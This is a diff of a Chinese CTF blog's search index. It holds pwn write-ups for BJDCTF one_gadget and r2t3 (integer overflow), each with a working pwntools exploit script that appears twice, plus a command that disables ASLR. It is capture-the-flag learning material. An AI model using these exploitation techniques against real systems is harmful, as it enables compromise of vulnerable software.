+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> - 表示关闭进程地址空间随机化。</span><br><span class="line"><span class="number">1</span> - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line"><span class="number">2</span> - 表示在<span class="number">1</span>的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>
+
+<p>liunx下关闭PIE的命令如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo -s echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p><a href="https://www.jianshu.com/p/31449fdfe35f">Checksec</a></p>
+]]></content>
       <categories>
-        <category>WriteUp/笔记</category>
+        <category>WriteUp</category>
       </categories>
+      <tags>
+        <tag>checksec</tag>
+      </tags>
   </entry>
   <entry>
     <title>CISCN_2019</title>
@@ -1012,6 +1004,14 @@
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>code</title>
+    <url>/article/code/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
       </categories>
   </entry>
   <entry>
@@ -1058,6 +1058,29 @@
       <categories>
         <category>WriteUp/笔记</category>
       </categories>
+  </entry>
+  <entry>
+    <title>One_gadget</title>
+    <url>/article/One_gadget/</url>
+    <content><![CDATA[<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><span id="more"></span>
+<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201127174608655.png" alt="在这里插入图片描述"></p>
+<p>会输出一个printf的地址</p>
+<p>使用one_gadget，计算一下libc的基址<br>buuctf给了远程的libc文件，下载下来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget [libcfilename]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>OneGadget</tag>
+      </tags>
   </entry>
   <entry>
     <title>orw</title>
@@ -1143,29 +1166,6 @@
       </tags>
   </entry>
   <entry>
-    <title>One_gadget</title>
-    <url>/article/One_gadget/</url>
-    <content><![CDATA[<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><span id="more"></span>
-<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127174608655.png" alt="在这里插入图片描述"></p>
-<p>会输出一个printf的地址</p>
-<p>使用one_gadget，计算一下libc的基址<br>buuctf给了远程的libc文件，下载下来</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget [libcfilename]</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>OneGadget</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>program</title>
     <url>/article/program/</url>
     <content><![CDATA[<p>记录编程相关</p>
@@ -1196,6 +1196,14 @@
 ]]></content>
       <categories>
         <category>program</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>shellcode</title>
+    <url>/article/shellcode/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
       </categories>
   </entry>
   <entry>
@@ -1252,48 +1260,6 @@
       </tags>
   </entry>
   <entry>
-    <title>shellcode</title>
-    <url>/article/shellcode/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>整形溢出</title>
-    <url>/article/Shaping%20overflow/</url>
-    <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
-<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
-<p>先看ida</p>
-<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
-<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
-<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
-<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
-<p>程序中给出了/bin/sh的地址</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<p>Int8, 等于Byte, 占1个字节.</p>
-<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
-<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
-<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
-<p>   　这样, 看起来比short,int,long更加直观些!</p>
-<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
-<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
-<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
-<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>整形溢出</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>systemcall</title>
     <url>/article/systemcall/</url>
     <content><![CDATA[<h1 id="systemcall"><a href="#systemcall" class="headerlink" title="systemcall"></a>systemcall</h1><span id="more"></span>
@@ -1336,6 +1302,40 @@
       </categories>
       <tags>
         <tag>SystemCall</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>整形溢出</title>
+    <url>/article/Shaping%20overflow/</url>
+    <content><![CDATA[<h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><span id="more"></span>
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>来自buuctf</p>
+<p>先看ida</p>
+<p><img src="https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。</p>
+<p>再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。</p>
+<p>同时还要满足3&lt; v3 &lt;8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中</p>
+<p><img src="https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4</p>
+<p>程序中给出了/bin/sh的地址</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26213</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048594</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x15</span>) + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x104</span>-<span class="number">0x19</span>) <span class="comment"># 0x15 + 0x4 + n = 0x104 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p>Int8, 等于Byte, 占1个字节.</p>
+<p>　   Int16, 等于short, 占2个字节. -32768 32767</p>
+<p>　   Int32, 等于int, 占4个字节. -2147483648 2147483647</p>
+<p>　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807</p>
+<p>   　这样, 看起来比short,int,long更加直观些!</p>
+<p>　　 另外, 还有一个Byte, 它等于byte, 0 - 255.</p>
+<p>　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。</p>
+<p>　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.</p>
+<p><a href="https://www.jianshu.com/p/757fe6d91669">参考1</a><br><a href="https://www.cnblogs.com/bhxdn/p/12572580.html">参考2</a></p>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>整形溢出</tag>
       </tags>
   </entry>
   <entry>
